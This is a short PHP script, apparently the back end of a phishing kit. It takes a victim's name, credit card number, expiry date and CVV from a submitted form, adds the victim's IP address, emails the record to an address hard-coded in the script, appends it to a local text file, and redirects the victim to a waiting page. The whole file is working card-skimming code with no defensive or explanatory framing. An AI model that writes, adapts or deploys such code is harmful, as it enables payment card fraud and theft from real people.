<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________xxx_____________\n";

$message .= "__________________CC NZ info_____________\n";
$message .= "Full Name          : ".$_POST['name']."\n";
$message .= "CC          : ".$_POST['cc']."\n";
$message .= "month          : ".$_POST['exp']."\n";
$message .= "year          : ".$_POST['exp1']."\n";
$message .= "CVV          : ".$_POST['cvv']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "_________| pegasus  |__________\n";

$subject = "CC INFO| ".$_POST['CC']." | $ip ";
$headers = "From:orsted ";
$email = ".$EX445093_REMOT.";
mail($email,$subject,$message,$headers);
$EX445093_REMOT = "echayoub@gmail.com";
$file = fopen('Flow.txt', 'a');

fwrite($file,$message);



header("Location: waiting.html");

?>